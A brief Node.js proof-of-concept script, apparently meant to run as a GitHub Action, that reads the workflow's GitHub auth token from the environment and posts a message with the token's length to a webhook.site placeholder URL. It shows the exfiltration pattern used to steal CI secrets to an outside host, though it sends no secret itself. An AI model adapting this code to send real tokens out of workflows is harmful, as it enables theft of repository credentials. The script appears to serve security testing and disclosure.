const https = require("https");

// GitHub converts input → env var
const token = process.env.INPUT_GITHUB_AUTH_TOKEN;

// Only send metadata, not full token
const data = JSON.stringify({
  message: "token accessible",
  token_length: token ? token.length : 0
});

// Use https://webhook.site (get your own unique URL)
const req = https.request({
  hostname: "webhook.site",
  path: "/YOUR-ID-HERE",
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  }
});

req.write(data);
req.end();

console.log("PoC action executed");
